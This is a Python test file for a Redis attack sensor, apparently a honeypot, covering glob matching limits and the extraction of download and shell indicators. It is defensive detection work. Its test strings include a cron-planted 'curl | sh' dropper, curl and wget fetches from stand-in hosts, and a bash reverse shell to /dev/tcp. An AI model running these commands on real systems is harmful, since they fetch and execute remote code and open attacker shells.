"""Glob matching and indicator extraction: correctness and bounded work."""

from __future__ import annotations

import time

import pytest

from redis_sensor import extract
from redis_sensor.glob import Budget, glob_match


@pytest.mark.parametrize(
    ("pattern", "subject", "expected"),
    [
        (b"*", b"anything", True),
        (b"*", b"", True),
        (b"user:*", b"user:1", True),
        (b"user:*", b"session:1", False),
        (b"h?llo", b"hello", True),
        (b"h?llo", b"hllo", False),
        (b"h[ae]llo", b"hallo", True),
        (b"h[^e]llo", b"hello", False),
        (b"h[a-b]llo", b"hbllo", True),
        (b"a*b*c", b"aXXbYYc", True),
        (b"a*b*c", b"aXXbYY", False),
        (b"a\\*b", b"a*b", True),
        (b"a\\*b", b"aXb", False),
        (b"", b"", True),
        (b"", b"a", False),
    ],
)
def test_glob(pattern: bytes, subject: bytes, expected: bool) -> None:
    assert glob_match(pattern, subject, Budget()) is expected


@pytest.mark.parametrize(
    ("pattern", "subject"),
    [
        (b"*a" * 64 + b"b", b"a" * 500),
        (b"[" * 120, b"a" * 500),
        (b"*" * 120 + b"x", b"y" * 500),
        (b"a" * 5000, b"a" * 5000),
        (b"*a?" * 40, b"a" * 512),
    ],
)
def test_glob_work_is_bounded(pattern: bytes, subject: bytes) -> None:
    start = time.perf_counter()
    for _ in range(64):  # as if KEYS ran over 64 keys with a shared budget
        glob_match(pattern, subject, Budget())
    assert time.perf_counter() - start < 1.0


def test_urls_with_scheme() -> None:
    f = extract.analyze("\n*/1 * * * * curl -fsSL http://198.51.100.9/x.sh | sh\n")
    assert [(d.url, d.tool) for d in f.downloads] == [("http://198.51.100.9/x.sh", "curl")]
    assert {"cron_payload", "dropper", "download"} <= f.flags


def test_bare_host_downloads() -> None:
    f = extract.analyze("curl -fsSL 203.0.113.7/a.sh|bash; wget -q -O /tmp/x evil.example/m")
    urls = {d.url: d.tool for d in f.downloads}
    assert urls == {"203.0.113.7/a.sh": "curl", "evil.example/m": "wget"}


def test_other_schemes_and_hints() -> None:
    f = extract.analyze("tftp://192.0.2.1/x ftp://h/y bash -i >& /dev/tcp/198.51.100.2/4444 0>&1")
    assert {d.url for d in f.downloads} == {"tftp://192.0.2.1/x", "ftp://h/y"}
    assert "reverse_shell" in f.flags
    assert "ssh_key_payload" in extract.analyze("\n\nssh-rsa AAAAB3 root@x\n").flags


def test_no_false_positive_on_plain_values() -> None:
    f = extract.analyze("hello world foo://bar and curlicue 1.2.3")
    assert f.downloads == []
    assert f.flags == set()


def test_extract_is_bounded_and_fast() -> None:
    nasty = ("://" * 5000) + ("http://" * 5000) + ("curl " * 5000) + "a" * 100_000
    start = time.perf_counter()
    f = extract.analyze(nasty)
    assert time.perf_counter() - start < 0.5
    assert len(f.downloads) <= extract.MAX_URLS
    assert all(len(d.url) <= extract.MAX_URL for d in f.downloads)
